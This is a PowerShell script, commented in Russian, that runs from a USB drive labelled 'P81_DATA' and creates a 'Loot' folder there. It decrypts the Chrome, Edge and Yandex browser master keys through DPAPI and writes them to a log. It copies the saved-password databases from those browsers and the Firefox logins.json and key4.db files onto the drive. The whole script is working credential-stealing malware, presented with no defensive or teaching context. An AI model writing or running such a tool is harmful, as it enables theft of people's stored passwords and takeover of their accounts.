# 1. Поиск флешки
$u = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
if (!$u) { exit }

# 2. Папка для сбора
$d = "$($u):\Loot\$(Get-Date -Format 'HH_mm_ss')"
New-Item -ItemType Directory -Path $d -Force | Out-Null
$log = "$d\DECRYPTED_KEYS.log"

# Подгружаем системную библиотеку для дешифровки
Add-Type -AssemblyName System.Security

$bList = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $bList) {
    $p = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $p) {
        $prefix = $b.n
        $ls = Join-Path $p "Local State"
        
        if (Test-Path $ls) {
            try {
                # Читаем JSON и достаем зашифрованный ключ
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                
                # Убираем префикс 'DPAPI' (первые 5 байт) и дешифруем через текущего пользователя
                $finalKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $base64MasterKey = [Convert]::ToBase64String($finalKey)
                
                # Записываем готовый результат в лог
                "[$prefix] Decrypted Master Key: $base64MasterKey" | Out-File -FilePath $log -Append -Encoding UTF8
                
                # Копируем и сам файл на всякий случай
                copy-item $ls -Destination "$d\$($prefix)_LocalState" -Force
            } catch {
                "[$prefix] Key decryption failed: $($_.Exception.Message)" | Out-File -FilePath $log -Append
            }
        }
        
        # Копируем базы паролей
        Get-ChildItem -Path $p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $prof = $_.Directory.Name
            copy-item $_.FullName -Destination "$d\$($prefix)_$($prof)_LoginData.db" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 3. Firefox (ключи дешифруются только на твоем компе через профиль)
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem -Path $ff -Directory | ForEach-Object {
        $src = $_.FullName
        copy-item "$src\logins.json" "$d\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
        copy-item "$src\key4.db" "$d\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
    }
}

exit
